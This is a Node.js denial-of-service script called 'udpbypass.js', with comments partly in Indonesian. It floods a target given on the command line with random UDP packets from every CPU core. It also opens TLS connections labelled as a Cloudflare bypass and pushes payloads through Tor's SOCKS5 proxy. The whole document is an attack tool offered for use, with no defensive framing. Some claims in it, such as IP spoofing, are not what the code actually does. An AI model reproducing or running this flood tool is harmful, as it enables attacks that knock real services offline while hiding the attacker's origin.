const cluster = require('cluster');
const dgram = require('dgram');
const tls = require('tls');
const axios = require('axios');
const os = require('os');
const { SocksClient } = require('socks');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];
const threadCount = os.cpus().length;

// Generate Random Payload
function generatePayload(size) {
    let payload = Buffer.alloc(size);
    for (let i = 0; i < size; i++) {
        payload[i] = Math.floor(Math.random() * 256); // Random data
    }
    return payload;
}

const payload = generatePayload(65500);

// Fake TLS Handshake untuk Bypass Cloudflare
function fakeTLS(target) {
    const options = {
        host: target,
        port: 443,
        servername: target,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2', 'http/1.1'],
    };

    const socket = tls.connect(options, () => {
        console.log('Connected with fake TLS handshake');
    });

    socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
}

// UDP Flood with IP Spoofing
function flood() {
    const socket = dgram.createSocket('udp4');
    setInterval(() => {
        for (let p = 0; p < 100; p++) {
            const randomPort = Math.floor(Math.random() * 65535); // Port asal acak
            const fragmentedPayload = generatePayload(Math.floor(Math.random() * (300 - 100 + 1)) + 100); // Fragment UDP
            socket.send(fragmentedPayload, 0, fragmentedPayload.length, port, target, () => {
                socket.bind(randomPort); // Spoofed Port
            });
        }
    });
}

// SOCKS5 Proxy Rotation
async function socksProxyFlood() {
    const info = await SocksClient.createConnection({
        proxy: {
            host: '127.0.0.1',
            port: 9050, // TOR Port
            type: 5
        },
        command: 'connect',
        destination: {
            host: target,
            port: parseInt(port)
        }
    });
    info.socket.write(payload);
}

if (cluster.isMaster) {
    console.clear();
    console.log(`🔥 udpbypass.js V1 | Bypass All Firewall - Target: ${target}:${port} for ${duration} seconds on ${threadCount} threads.`);

    // Fork semua core CPU
    for (let i = 0; i < threadCount; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('✅ Attack stopped.');
        process.exit(0);
    }, duration * 1000);
} else {
    flood(); // UDP Flood
    fakeTLS(target); // Fake TLS Bypass
    socksProxyFlood(); // SOCKS5 Proxy Rotation
}